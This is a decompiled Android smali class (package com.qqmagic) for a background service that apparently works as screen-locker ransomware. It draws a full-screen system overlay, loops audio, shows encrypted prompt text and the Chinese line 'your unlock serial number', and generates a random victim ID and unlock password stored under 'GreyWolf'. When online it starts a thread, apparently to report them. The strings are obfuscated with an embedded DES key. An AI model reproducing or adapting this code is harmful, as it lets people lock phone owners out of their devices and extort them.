.class public Lcom/qqmagic/s;
.super Landroid/app/Service;
.source "s.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/qqmagic/s$100000000;,
        Lcom/qqmagic/s$100000001;,
        Lcom/qqmagic/s$100000002;,
        Lcom/qqmagic/s$100000003;,
        Lcom/qqmagic/s$100000004;,
        Lcom/qqmagic/s$100000005;
    }
.end annotation


# instance fields
.field anim1:Landroid/view/animation/Animation;

.field anim2:Landroid/view/animation/Animation;

.field anim3:Landroid/view/animation/Animation;

.field anim4:Landroid/view/animation/Animation;

.field bt:Landroid/widget/Button;

.field des:Lcom/qqmagic/d;

.field ed:Landroid/widget/EditText;

.field editor:Landroid/content/SharedPreferences$Editor;

.field private mFloatLayout:Landroid/view/View;

.field private mWindowManager:Landroid/view/WindowManager;

.field mp:Landroid/media/MediaPlayer;

.field net:Lcom/qqmagic/n;

.field pass:J

.field passw:I

.field password:Ljava/lang/String;

.field ppss:Ljava/lang/String;

.field share:Landroid/content/SharedPreferences;

.field show1:Landroid/widget/TextView;

.field show2:Landroid/widget/TextView;

.field show3:Landroid/widget/TextView;

.field show4:Landroid/widget/TextView;

.field tv:Landroid/widget/TextView;

.field private vibrator:Landroid/os/Vibrator;

.field private wmParams:Landroid/view/WindowManager$LayoutParams;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 486
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$L1000000(Lcom/qqmagic/s;)Landroid/os/Vibrator;
    .locals 1

    iget-object v0, p0, Lcom/qqmagic/s;->vibrator:Landroid/os/Vibrator;

    return-object v0
.end method

.method static synthetic access$L1000002(Lcom/qqmagic/s;)Landroid/view/WindowManager;
    .locals 1

    iget-object v0, p0, Lcom/qqmagic/s;->mWindowManager:Landroid/view/WindowManager;

    return-object v0
.end method

.method static synthetic access$L1000003(Lcom/qqmagic/s;)Landroid/view/View;
    .locals 1

    iget-object v0, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    return-object v0
.end method

.method static synthetic access$S1000000(Lcom/qqmagic/s;Landroid/os/Vibrator;)V
    .locals 0

    iput-object p1, p0, Lcom/qqmagic/s;->vibrator:Landroid/os/Vibrator;

    return-void
.end method

.method static synthetic access$S1000002(Lcom/qqmagic/s;Landroid/view/WindowManager;)V
    .locals 0

    iput-object p1, p0, Lcom/qqmagic/s;->mWindowManager:Landroid/view/WindowManager;

    return-void
.end method

.method static synthetic access$S1000003(Lcom/qqmagic/s;Landroid/view/View;)V
    .locals 0

    iput-object p1, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    return-void
.end method

.method private createFloatView()V
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    const/4 v2, -0x1

    const/4 v4, 0x0

    .line 243
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v0}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v0, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 245
    invoke-virtual {p0}, Lcom/qqmagic/s;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-virtual {p0}, Lcom/qqmagic/s;->getApplication()Landroid/app/Application;

    sget-object v1, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/qqmagic/s;->mWindowManager:Landroid/view/WindowManager;

    .line 248
    iget-object v0, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0x7da

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 256
    iget-object v0, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v1, 0x1

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 262
    iget-object v0, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0x500

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 269
    iget-object v0, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0x31

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 271
    iget-object v0, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    iput v4, v0, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 272
    iget-object v0, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    iput v4, v0, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 274
    iget-object v0, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    iput v2, v0, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 275
    iget-object v0, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    iput v2, v0, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 280
    invoke-virtual {p0}, Lcom/qqmagic/s;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-static {v0}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v1

    .line 282
    const v2, 0x7f030001

    const/4 v0, 0x0

    check-cast v0, Landroid/view/ViewGroup;

    invoke-virtual {v1, v2, v0}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    .line 286
    iget-object v0, p0, Lcom/qqmagic/s;->mWindowManager:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    iget-object v2, p0, Lcom/qqmagic/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 287
    iget-object v0, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    const v1, 0x7f090002

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/qqmagic/s;->bt:Landroid/widget/Button;

    .line 288
    iget-object v0, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    const v1, 0x7f090001

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/qqmagic/s;->ed:Landroid/widget/EditText;

    .line 289
    iget-object v0, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    const/high16 v1, 0x7f090000

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/qqmagic/s;->tv:Landroid/widget/TextView;

    .line 290
    iget-object v0, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    const v1, 0x7f090003

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/qqmagic/s;->show1:Landroid/widget/TextView;

    .line 291
    iget-object v0, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    const v1, 0x7f090004

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/qqmagic/s;->show2:Landroid/widget/TextView;

    .line 292
    iget-object v0, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    const v1, 0x7f090006

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/qqmagic/s;->show3:Landroid/widget/TextView;

    .line 293
    iget-object v0, p0, Lcom/qqmagic/s;->mFloatLayout:Landroid/view/View;

    const v1, 0x7f090005

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/qqmagic/s;->show4:Landroid/widget/TextView;

    .line 296
    :try_start_0
    iget-object v0, p0, Lcom/qqmagic/s;->ed:Landroid/widget/EditText;

    iget-object v1, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    const-string v2, "2b1aaad979379b7d93b0a65e31e0209f46d930434d258e98b6eea5960510350d"

    invoke-virtual {v1, v2}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V

    .line 299
    iget-object v0, p0, Lcom/qqmagic/s;->tv:Landroid/widget/TextView;

    iget-object v1, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    const-string v2, "c7004861d59cefa2f95295c637841802778af8f853fe2a9ff4964a3841621f3299a642a763aaa079d859b41d141d22122ef5e0b153daed82e6f3a499214c49e94fabc407496e656e89ec64260b5f680804773cda9873ceb8bf1b855384fb19ad4a8f2e82e5508db5490717e4879a4b593d7a3ed7c91f95373d1ce17fafb61846a262c0412ea8755bd958400ac34796f89605ef7012d37e1a78114cb1f5c92338252a3740f07e3e28"

    invoke-virtual {v1, v2}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 301
    iget-object v0, p0, Lcom/qqmagic/s;->show1:Landroid/widget/TextView;

    iget-object v1, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    const-string v2, "84bdc1cddffa02e6e258c751f9cc2f95ef0690a7dc589598f571631083fdedc3"

    invoke-virtual {v1, v2}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 302
    iget-object v0, p0, Lcom/qqmagic/s;->show2:Landroid/widget/TextView;

    iget-object v1, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    const-string v2, "358b69f85bfda672702b6daf55c417c2"

    invoke-virtual {v1, v2}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 303
    iget-object v0, p0, Lcom/qqmagic/s;->show3:Landroid/widget/TextView;

    iget-object v1, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    const-string v2, "92f0dd0c531f565dee6d365cab501cc8d90421b721615a77"

    invoke-virtual {v1, v2}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 304
    iget-object v0, p0, Lcom/qqmagic/s;->show4:Landroid/widget/TextView;

    iget-object v1, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    const-string v2, "208fc01b14a2d8445cfe863af3495a12"

    invoke-virtual {v1, v2}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 311
    :goto_0
    invoke-virtual {p0}, Lcom/qqmagic/s;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const v1, 0x7f040002

    invoke-static {v0, v1}, Landroid/view/animation/AnimationUtils;->loadAnimation(Landroid/content/Context;I)Landroid/view/animation/Animation;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->anim3:Landroid/view/animation/Animation;

    .line 312
    iget-object v0, p0, Lcom/qqmagic/s;->anim3:Landroid/view/animation/Animation;

    new-instance v1, Lcom/qqmagic/s$100000001;

    invoke-direct {v1, p0}, Lcom/qqmagic/s$100000001;-><init>(Lcom/qqmagic/s;)V

    invoke-virtual {v0, v1}, Landroid/view/animation/Animation;->setAnimationListener(Landroid/view/animation/Animation$AnimationListener;)V

    .line 337
    invoke-virtual {p0}, Lcom/qqmagic/s;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/high16 v1, 0x7f040000

    invoke-static {v0, v1}, Landroid/view/animation/AnimationUtils;->loadAnimation(Landroid/content/Context;I)Landroid/view/animation/Animation;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->anim1:Landroid/view/animation/Animation;

    .line 338
    iget-object v0, p0, Lcom/qqmagic/s;->anim1:Landroid/view/animation/Animation;

    new-instance v1, Lcom/qqmagic/s$100000002;

    invoke-direct {v1, p0}, Lcom/qqmagic/s$100000002;-><init>(Lcom/qqmagic/s;)V

    invoke-virtual {v0, v1}, Landroid/view/animation/Animation;->setAnimationListener(Landroid/view/animation/Animation$AnimationListener;)V

    .line 364
    invoke-virtual {p0}, Lcom/qqmagic/s;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const v1, 0x7f040001

    invoke-static {v0, v1}, Landroid/view/animation/AnimationUtils;->loadAnimation(Landroid/content/Context;I)Landroid/view/animation/Animation;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->anim2:Landroid/view/animation/Animation;

    .line 365
    iget-object v0, p0, Lcom/qqmagic/s;->anim2:Landroid/view/animation/Animation;

    new-instance v1, Lcom/qqmagic/s$100000003;

    invoke-direct {v1, p0}, Lcom/qqmagic/s$100000003;-><init>(Lcom/qqmagic/s;)V

    invoke-virtual {v0, v1}, Landroid/view/animation/Animation;->setAnimationListener(Landroid/view/animation/Animation$AnimationListener;)V

    .line 392
    invoke-virtual {p0}, Lcom/qqmagic/s;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const v1, 0x7f040003

    invoke-static {v0, v1}, Landroid/view/animation/AnimationUtils;->loadAnimation(Landroid/content/Context;I)Landroid/view/animation/Animation;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->anim4:Landroid/view/animation/Animation;

    .line 393
    iget-object v0, p0, Lcom/qqmagic/s;->anim4:Landroid/view/animation/Animation;

    new-instance v1, Lcom/qqmagic/s$100000004;

    invoke-direct {v1, p0}, Lcom/qqmagic/s$100000004;-><init>(Lcom/qqmagic/s;)V

    invoke-virtual {v0, v1}, Landroid/view/animation/Animation;->setAnimationListener(Landroid/view/animation/Animation$AnimationListener;)V

    .line 419
    iget-object v0, p0, Lcom/qqmagic/s;->show4:Landroid/widget/TextView;

    iget-object v1, p0, Lcom/qqmagic/s;->anim4:Landroid/view/animation/Animation;

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->startAnimation(Landroid/view/animation/Animation;)V

    .line 420
    iget-object v0, p0, Lcom/qqmagic/s;->bt:Landroid/widget/Button;

    new-instance v1, Lcom/qqmagic/s$100000005;

    invoke-direct {v1, p0}, Lcom/qqmagic/s$100000005;-><init>(Lcom/qqmagic/s;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 447
    iget-object v0, p0, Lcom/qqmagic/s;->tv:Landroid/widget/TextView;

    new-instance v1, Ljava/lang/StringBuffer;

    invoke-direct {v1}, Ljava/lang/StringBuffer;-><init>()V

    const-string v2, "\u4f60\u7684\u89e3\u9501\u5e8f\u5217\u53f7"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v1

    iget-object v2, p0, Lcom/qqmagic/s;->share:Landroid/content/SharedPreferences;

    const-string v3, "m"

    int-to-long v4, v4

    invoke-interface {v2, v3, v4, v5}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuffer;->append(J)Ljava/lang/StringBuffer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    return-void

    .line 304
    :catch_0
    move-exception v0

    goto/16 :goto_0
.end method

.method public static h(Ljava/lang/String;I)Ljava/lang/String;
    .locals 4

    .prologue
    .line 477
    const-string v1, ""

    .line 478
    const-string v0, "/"

    invoke-virtual {p0, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 479
    const/4 v0, 0x1

    .line 480
    :goto_0
    array-length v3, v2

    if-lt v0, v3, :cond_0

    .line 485
    return-object v1

    .line 482
    :cond_0
    new-instance v3, Ljava/lang/StringBuffer;

    invoke-direct {v3}, Ljava/lang/StringBuffer;-><init>()V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v1

    aget-object v3, v2, v0

    invoke-static {v3, p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result v3

    int-to-char v3, v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v1

    .line 483
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method


# virtual methods
.method public isNetworkConnected(Landroid/content/Context;)Z
    .locals 1

    .prologue
    .line 456
    if-eqz p1, :cond_0

    .line 458
    const-string v0, "connectivity"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 462
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    .line 464
    if-eqz v0, :cond_0

    .line 467
    invoke-virtual {v0}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v0

    .line 470
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 40
    const/4 v0, 0x0

    check-cast v0, Landroid/os/IBinder;

    return-object v0
.end method

.method public onCreate()V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    const/4 v4, 0x0

    invoke-static {p0}, LLogCatBroadcaster;->start(Landroid/content/Context;)V

    .line 48
    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v0

    const v2, 0x989680

    int-to-double v2, v2

    mul-double/2addr v0, v2

    double-to-long v0, v0

    iput-wide v0, p0, Lcom/qqmagic/s;->pass:J

    .line 49
    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v0

    const v2, 0xf4240

    int-to-double v2, v2

    mul-double/2addr v0, v2

    double-to-int v0, v0

    iput v0, p0, Lcom/qqmagic/s;->passw:I

    .line 50
    new-instance v0, Lcom/qqmagic/n;

    invoke-direct {v0}, Lcom/qqmagic/n;-><init>()V

    iput-object v0, p0, Lcom/qqmagic/s;->net:Lcom/qqmagic/n;

    .line 51
    new-instance v0, Lcom/qqmagic/d;

    const-string v1, "/39e3/65h6/3d70/38cg"

    const/16 v2, 0x12

    invoke-static {v1, v2}, Lcom/qqmagic/s;->h(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Lcom/qqmagic/d;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    .line 53
    const-string v0, "GreyWolf"

    invoke-virtual {p0, v0, v4}, Lcom/qqmagic/s;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->share:Landroid/content/SharedPreferences;

    .line 54
    iget-object v0, p0, Lcom/qqmagic/s;->share:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->editor:Landroid/content/SharedPreferences$Editor;

    .line 55
    const-string v0, "vibrator"

    invoke-virtual {p0, v0}, Lcom/qqmagic/s;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/Vibrator;

    iput-object v0, p0, Lcom/qqmagic/s;->vibrator:Landroid/os/Vibrator;

    .line 56
    iget-object v0, p0, Lcom/qqmagic/s;->share:Landroid/content/SharedPreferences;

    const-string v1, "m"

    int-to-long v2, v4

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    int-to-long v2, v4

    cmp-long v0, v0, v2

    if-nez v0, :cond_0

    .line 68
    iget-object v0, p0, Lcom/qqmagic/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "m"

    iget-wide v2, p0, Lcom/qqmagic/s;->pass:J

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 69
    iget-object v0, p0, Lcom/qqmagic/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 72
    :try_start_0
    iget-object v0, p0, Lcom/qqmagic/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "passw"

    iget-object v2, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    new-instance v3, Ljava/lang/StringBuffer;

    invoke-direct {v3}, Ljava/lang/StringBuffer;-><init>()V

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v3

    iget v4, p0, Lcom/qqmagic/s;->passw:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lcom/qqmagic/d;->encrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 73
    iget-object v0, p0, Lcom/qqmagic/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 79
    :goto_0
    invoke-virtual {p0}, Lcom/qqmagic/s;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/qqmagic/s;->isNetworkConnected(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 83
    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V

    iget-object v1, p0, Lcom/qqmagic/s;->share:Landroid/content/SharedPreferences;

    const-string v2, "m"

    const/16 v3, 0x8

    int-to-long v3, v3

    invoke-interface {v1, v2, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuffer;->append(J)Ljava/lang/StringBuffer;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->ppss:Ljava/lang/String;

    .line 86
    :try_start_1
    iget-object v0, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    iget-object v1, p0, Lcom/qqmagic/s;->share:Landroid/content/SharedPreferences;

    const-string v2, "passw"

    const-string v3, ""

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->password:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 90
    :goto_1
    new-instance v0, Lcom/qqmagic/s$100000000;

    invoke-direct {v0, p0}, Lcom/qqmagic/s$100000000;-><init>(Lcom/qqmagic/s;)V

    invoke-virtual {v0}, Lcom/qqmagic/s$100000000;->start()V

    .line 122
    :cond_0
    :goto_2
    return-void

    .line 119
    :cond_1
    :try_start_2
    iget-object v0, p0, Lcom/qqmagic/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "m"

    iget-object v2, p0, Lcom/qqmagic/s;->des:Lcom/qqmagic/d;

    const-string v3, "3fb3e95abfcf75edabe573c64d4cbb19"

    invoke-virtual {v2, v3}, Lcom/qqmagic/d;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 120
    iget-object v0, p0, Lcom/qqmagic/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 121
    iget-object v0, p0, Lcom/qqmagic/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "passw"

    const-string v2, "3feeece337a85bbaae2a314957051fe3"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 122
    iget-object v0, p0, Lcom/qqmagic/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_2

    :catch_0
    move-exception v0

    goto :goto_2

    .line 86
    :catch_1
    move-exception v0

    goto :goto_1

    .line 73
    :catch_2
    move-exception v0

    goto :goto_0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Intent;",
            "I)V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 134
    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 135
    invoke-direct {p0}, Lcom/qqmagic/s;->createFloatView()V

    .line 136
    invoke-virtual {p0}, Lcom/qqmagic/s;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/high16 v1, 0x7f050000

    invoke-static {v0, v1}, Landroid/media/MediaPlayer;->create(Landroid/content/Context;I)Landroid/media/MediaPlayer;

    move-result-object v0

    iput-object v0, p0, Lcom/qqmagic/s;->mp:Landroid/media/MediaPlayer;

    .line 137
    iget-object v0, p0, Lcom/qqmagic/s;->mp:Landroid/media/MediaPlayer;

    invoke-virtual {v0}, Landroid/media/MediaPlayer;->start()V

    .line 138
    iget-object v0, p0, Lcom/qqmagic/s;->mp:Landroid/media/MediaPlayer;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/media/MediaPlayer;->setLooping(Z)V

    return-void
.end method
